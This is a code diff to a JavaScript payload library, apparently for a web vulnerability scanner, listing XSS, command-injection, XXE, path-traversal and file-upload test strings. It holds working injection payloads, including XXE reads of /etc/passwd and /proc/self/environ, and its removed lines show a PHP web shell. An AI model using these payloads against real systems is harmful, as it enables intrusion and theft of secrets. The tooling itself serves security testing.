@@ -6,11 +6,11 @@ const payloadsByType = {
     '" onmouseover="alert(1)"',
     '<svg/onload=alert(1)>'
   ],
-  command: ['; whoami', '&& id', '| cat /etc/passwd', '$(uname -a)', '`whoami`'],
+  command: ['; whoami', '&& id', '| uname -a', '`whoami`', '|| ver'],
   xxe: [
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
-    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://example.com/xxe">]><data>&xxe;</data>'
+    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><data>&xxe;</data>'
   ],
   pathtraversal: [
     '../../../../etc/passwd',
@@ -28,19 +28,19 @@ const payloadsByType = {
   ],
   fileupload: [
     {
-      name: 'shell.php',
-      content: '<?php system($_GET["cmd"]); ?>',
-      mimeType: 'application/x-php'
+      name: 'upload_probe.php',
+      mimeType: 'application/octet-stream',
+      content: 'SECURITY_TEST_FILE_UPLOAD_PROBE_PHP'
     },
     {
-      name: 'shell.jsp',
-      content: '<%@ page import="java.io.*" %><% String cmd = request.getParameter("c"); %>',
-      mimeType: 'application/octet-stream'
+      name: 'upload_probe.jsp',
+      mimeType: 'application/octet-stream',
+      content: 'SECURITY_TEST_FILE_UPLOAD_PROBE_JSP'
     },
     {
-      name: 'shell.aspx',
-      content: '<%@ Page Language="C#" %><% Response.Write("test"); %>',
-      mimeType: 'application/octet-stream'
+      name: 'upload_probe.aspx',
+      mimeType: 'application/octet-stream',
+      content: 'SECURITY_TEST_FILE_UPLOAD_PROBE_ASPX'
     }
   ],
   auth: [
@@ -76,15 +76,18 @@ function getPayloads(type) {
   }
 
   const normalizedType = normalizeType(type);
-  if (!payloadsByType[normalizedType]) {
+  const payloads = payloadsByType[normalizedType];
+
+  if (!payloads) {
     throw new Error(`Unsupported payload type: ${type}`);
   }
 
-  return payloadsByType[normalizedType];
+  return payloads;
 }
 
 function pickPayload(type, index = 0) {
   const list = getPayloads(type);
+
   if (!Array.isArray(list) || list.length === 0) {
     throw new Error(`No payloads available for type: ${type}`);
   }
@@ -111,7 +114,6 @@ function injectPayload(inputs, payload) {
 
     if (input && typeof input.name === 'string' && input.name.trim()) {
       data[input.name] = payload;
-      continue;
     }
   }
 
